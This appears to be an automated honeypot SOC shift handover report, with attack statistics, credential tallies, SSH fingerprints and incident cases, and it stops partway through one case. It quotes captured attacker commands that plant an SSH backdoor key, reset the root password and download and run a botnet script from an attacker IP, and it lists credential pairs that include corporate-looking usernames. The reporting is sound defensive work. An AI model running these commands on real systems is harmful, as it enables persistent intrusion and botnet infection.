# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-25 |
| **Generated At** | 2026-11-25T20:50:31Z |
| **Shift Time** | 20:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **505** |
| Confirmed Threats | **445** |
| False Positives Filtered | **60** (11.9%) |
| Unique Attacker IPs | **176** |
| Countries of Origin | **47** |
| High Severity Cases | **371** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **134** |
| Malware Samples Analyzed | **9** HIGH · **27** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **672** |
| Unique Credential Pairs | **315** |
| Unique Usernames | **102** |
| Unique Passwords | **176** |
| Successful Auth Pairs | **491** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 246 |
| `admin` | 86 |
| `rootssssss23424123123` | 60 |
| `support` | 26 |
| `nobody` | 18 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 120 |
| `Demo123!` | 71 |
| `rootssssss23424123123` | 60 |
| `root3245gs5662d34111111111` | 60 |
| `support` | 20 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 60 |
| `root` | `root3245gs5662d34111111111` | 53 |
| `support` | `support` | 20 |
| `nobody` | `` | 18 |
| `admin` | `admin` | 13 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `l.luis.gomez@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:16 |
| `l.luis.gomez` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:17 |
| `roberto.eduardo.soto@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:19 |
| `roberto.eduardo.soto` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:20 |
| `joaquin.lopez@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:22 |
| `joaquin.lopez` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:23 |
| `nelson.garnier@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:25 |
| `nelson.garnier` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:26 |
| `francisco.molina@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:28 |
| `francisco.molina` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:29 |
| `francisco.d.diaz@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:31 |
| `francisco.d.diaz` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:32 |
| `admin@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:34 |
| `admin` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:35 |
| `sumit.aukta@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:37 |
| `sumit.aukta` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:39 |
| `mario.pedraza.gutierrez@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:40 |
| `mario.pedraza.gutierrez` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:41 |
| `sarvesh.r.singh@oracle.com` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:43 |
| `sarvesh.r.singh` | `Demo123!` | `144.24.207.3` | 2026-11-25T03:03:45 |
_… 471 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **505** |
| Sessions with Fingerprint | **21** |
| Unique HASSH Fingerprints | **21** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 231 |
| libssh | 138 |
| Paramiko (Python) | 3 |
| Unknown | 3 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 199 | 3 |
| `f555226df196...` | Mirai/variant | 131 | 64 |
| `7d01d047ace6...` | Mirai/variant | 13 | 3 |
| `eff4c24daffc...` | Modern SSH client | 6 | 1 |
| `16443846184e...` | Generic scanner | 4 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 199 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 131 | 64 | Mirai/variant |
| `7d01d047ace6...` | Go SSH scanner | 13 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 4 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `98f63c4d9c87...` | Go SSH scanner | 4 | 4 | Generic scanner |
| `4c94058d5e9e...` | Paramiko (Python) | 3 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **203** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 66 | 59 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:bjjOdlaGl9lf"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.118.25`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `107.150.105.153`, `40.112.183.29`, `202.70.78.237`, `98.70.48.241`, `213.154.77.61`, `138.68.103.218`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **176** |
| Unique ASNs | **93** |
| High-Risk ASNs | **67** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 39 | HIGH |
| `AS8075` | Microsoft Corporation | 7 | HIGH |
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 6 | MEDIUM |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS8346` | SONATEL-AS Autonomous System | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (364)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9a631b7efd66

| Field | Detail |
|---|---|
| **Source IP** | `138.124.116[.]194` |
| **First Seen** | 2026-11-25 07:58 |
| **Last Seen** | 2026-11-25 07:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36, Accept-Encoding: identity, Accept: */*, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 07:58:02` | `cowrie.session.connect` |
| `2026-11-25 07:58:02` | `cowrie.login.success` |
| `2026-11-25 07:58:03` | `cowrie.session.params` |
| `2026-11-25 07:58:03` | `cowrie.command.input` |
| `2026-11-25 07:58:03` | `cowrie.command.input` |
| `2026-11-25 07:58:03` | `cowrie.command.failed` |
| `2026-11-25 07:58:03` | `cowrie.command.input` |
| `2026-11-25 07:58:03` | `cowrie.command.failed` |
| `2026-11-25 07:58:03` | `cowrie.command.input` |
| `2026-11-25 07:58:03` | `cowrie.command.failed` |
| `2026-11-25 07:58:03` | `cowrie.command.input` |
| `2026-11-25 07:58:03` | `cowrie.log.closed` |
| `2026-11-25 07:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.116[.]194` to AbuseIPDB if not already reported
- [ ] Block `138.124.116[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ef659d27dc8

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-11-25 08:06 |
| **Last Seen** | 2026-11-25 08:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:06:31` | `cowrie.session.connect` |
| `2026-11-25 08:06:31` | `cowrie.login.success` |
| `2026-11-25 08:06:32` | `cowrie.session.params` |
| `2026-11-25 08:06:32` | `cowrie.command.input` |
| `2026-11-25 08:06:32` | `cowrie.command.failed` |
| `2026-11-25 08:06:32` | `cowrie.command.input` |
| `2026-11-25 08:06:32` | `cowrie.command.failed` |
| `2026-11-25 08:06:32` | `cowrie.command.input` |
| `2026-11-25 08:06:32` | `cowrie.command.failed` |
| `2026-11-25 08:06:32` | `cowrie.command.input` |
| `2026-11-25 08:06:32` | `cowrie.command.input` |
| `2026-11-25 08:06:33` | `cowrie.command.input` |
| `2026-11-25 08:06:33` | `cowrie.session.file_download` |
| `2026-11-25 08:06:33` | `cowrie.session.file_download` |
| `2026-11-25 08:06:33` | `cowrie.session.file_download` |
| … | _3 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b76a58bd7ec

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-11-25 08:06 |
| **Last Seen** | 2026-11-25 08:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:06:33` | `cowrie.session.connect` |
| `2026-11-25 08:06:33` | `cowrie.login.success` |
| `2026-11-25 08:06:33` | `cowrie.session.params` |
| `2026-11-25 08:06:33` | `cowrie.command.input` |
| `2026-11-25 08:06:34` | `cowrie.session.file_download` |
| `2026-11-25 08:06:34` | `cowrie.session.file_download` |
| `2026-11-25 08:06:34` | `cowrie.session.file_download` |
| `2026-11-25 08:06:34` | `cowrie.session.file_download.failed` |
| `2026-11-25 08:06:36` | `cowrie.log.closed` |
| `2026-11-25 08:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e443906d274

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-11-25 08:11 |
| **Last Seen** | 2026-11-25 08:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:11:50` | `cowrie.session.connect` |
| `2026-11-25 08:11:50` | `cowrie.client.version` |
| `2026-11-25 08:11:50` | `cowrie.client.kex` |
| `2026-11-25 08:11:50` | `cowrie.login.success` |
| `2026-11-25 08:11:51` | `cowrie.session.params` |
| `2026-11-25 08:11:51` | `cowrie.command.input` |
| `2026-11-25 08:11:51` | `cowrie.command.failed` |
| `2026-11-25 08:11:51` | `cowrie.log.closed` |
| `2026-11-25 08:11:52` | `cowrie.session.params` |
| `2026-11-25 08:11:52` | `cowrie.command.input` |
| `2026-11-25 08:11:52` | `cowrie.session.file_download` |
| `2026-11-25 08:11:52` | `cowrie.log.closed` |
| `2026-11-25 08:11:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00be3e70cd1

| Field | Detail |
|---|---|
| **Source IP** | `88.142.46[.]185` |
| **First Seen** | 2026-11-25 08:11 |
| **Last Seen** | 2026-11-25 08:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:11:52` | `cowrie.session.connect` |
| `2026-11-25 08:11:52` | `cowrie.client.version` |
| `2026-11-25 08:11:52` | `cowrie.client.kex` |
| `2026-11-25 08:11:53` | `cowrie.login.success` |
| `2026-11-25 08:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.142.46[.]185` to AbuseIPDB if not already reported
- [ ] Block `88.142.46[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af032480211

| Field | Detail |
|---|---|
| **Source IP** | `112.78.10[.]55` |
| **First Seen** | 2026-11-25 08:15 |
| **Last Seen** | 2026-11-25 08:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:15:26` | `cowrie.session.connect` |
| `2026-11-25 08:15:26` | `cowrie.client.version` |
| `2026-11-25 08:15:26` | `cowrie.client.kex` |
| `2026-11-25 08:15:27` | `cowrie.login.success` |
| `2026-11-25 08:15:28` | `cowrie.session.params` |
| `2026-11-25 08:15:28` | `cowrie.command.input` |
| `2026-11-25 08:15:28` | `cowrie.command.failed` |
| `2026-11-25 08:15:29` | `cowrie.log.closed` |
| `2026-11-25 08:15:30` | `cowrie.session.params` |
| `2026-11-25 08:15:30` | `cowrie.command.input` |
| `2026-11-25 08:15:30` | `cowrie.session.file_download` |
| `2026-11-25 08:15:30` | `cowrie.log.closed` |
| `2026-11-25 08:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.10[.]55` to AbuseIPDB if not already reported
- [ ] Block `112.78.10[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-325d3c5f9258

| Field | Detail |
|---|---|
| **Source IP** | `112.78.10[.]55` |
| **First Seen** | 2026-11-25 08:15 |
| **Last Seen** | 2026-11-25 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:15:30` | `cowrie.session.connect` |
| `2026-11-25 08:15:30` | `cowrie.client.version` |
| `2026-11-25 08:15:31` | `cowrie.client.kex` |
| `2026-11-25 08:15:32` | `cowrie.login.success` |
| `2026-11-25 08:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.10[.]55` to AbuseIPDB if not already reported
- [ ] Block `112.78.10[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def49440e91d

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-11-25 08:18 |
| **Last Seen** | 2026-11-25 08:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:18:01` | `cowrie.session.connect` |
| `2026-11-25 08:18:01` | `cowrie.client.version` |
| `2026-11-25 08:18:01` | `cowrie.client.kex` |
| `2026-11-25 08:18:02` | `cowrie.login.success` |
| `2026-11-25 08:18:04` | `cowrie.session.params` |
| `2026-11-25 08:18:04` | `cowrie.command.input` |
| `2026-11-25 08:18:04` | `cowrie.command.failed` |
| `2026-11-25 08:18:04` | `cowrie.log.closed` |
| `2026-11-25 08:18:05` | `cowrie.session.params` |
| `2026-11-25 08:18:05` | `cowrie.command.input` |
| `2026-11-25 08:18:05` | `cowrie.session.file_download` |
| `2026-11-25 08:18:05` | `cowrie.log.closed` |
| `2026-11-25 08:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83aca99eedd2

| Field | Detail |
|---|---|
| **Source IP** | `197.221.232[.]44` |
| **First Seen** | 2026-11-25 08:18 |
| **Last Seen** | 2026-11-25 08:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:18:05` | `cowrie.session.connect` |
| `2026-11-25 08:18:05` | `cowrie.client.version` |
| `2026-11-25 08:18:06` | `cowrie.client.kex` |
| `2026-11-25 08:18:07` | `cowrie.login.success` |
| `2026-11-25 08:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.221.232[.]44` to AbuseIPDB if not already reported
- [ ] Block `197.221.232[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a59701b5897f

| Field | Detail |
|---|---|
| **Source IP** | `167.99.98[.]129` |
| **First Seen** | 2026-11-25 08:18 |
| **Last Seen** | 2026-11-25 08:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:18:07` | `cowrie.session.connect` |
| `2026-11-25 08:18:07` | `cowrie.client.version` |
| `2026-11-25 08:18:07` | `cowrie.client.kex` |
| `2026-11-25 08:18:07` | `cowrie.login.success` |
| `2026-11-25 08:18:08` | `cowrie.session.params` |
| `2026-11-25 08:18:08` | `cowrie.command.input` |
| `2026-11-25 08:18:08` | `cowrie.command.failed` |
| `2026-11-25 08:18:08` | `cowrie.log.closed` |
| `2026-11-25 08:18:08` | `cowrie.session.params` |
| `2026-11-25 08:18:08` | `cowrie.command.input` |
| `2026-11-25 08:18:09` | `cowrie.session.file_download` |
| `2026-11-25 08:18:09` | `cowrie.log.closed` |
| `2026-11-25 08:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.98[.]129` to AbuseIPDB if not already reported
- [ ] Block `167.99.98[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779490585f4a

| Field | Detail |
|---|---|
| **Source IP** | `167.99.98[.]129` |
| **First Seen** | 2026-11-25 08:18 |
| **Last Seen** | 2026-11-25 08:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-25 08:18:09` | `cowrie.session.connect` |
| `2026-11-25 08:18:09` | `cowrie.client.version` |
| `2026-11-25 08:18:09` | `cowrie.client.kex` |
| `2026-11-25 08:18:09` | `cowrie.login.success` |
| `2026-11-25 08:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.98[.]129` to AbuseIPDB if not already reported
- [ ] Block `167.99.98[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd7466411a41

| Field | Detail |
|---|---|
| **Source IP** | `129.121.99[.]2` |
| **First Seen** | 2026-11-25 08:18 |
| **Last Seen** | 2026-11-25 08:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
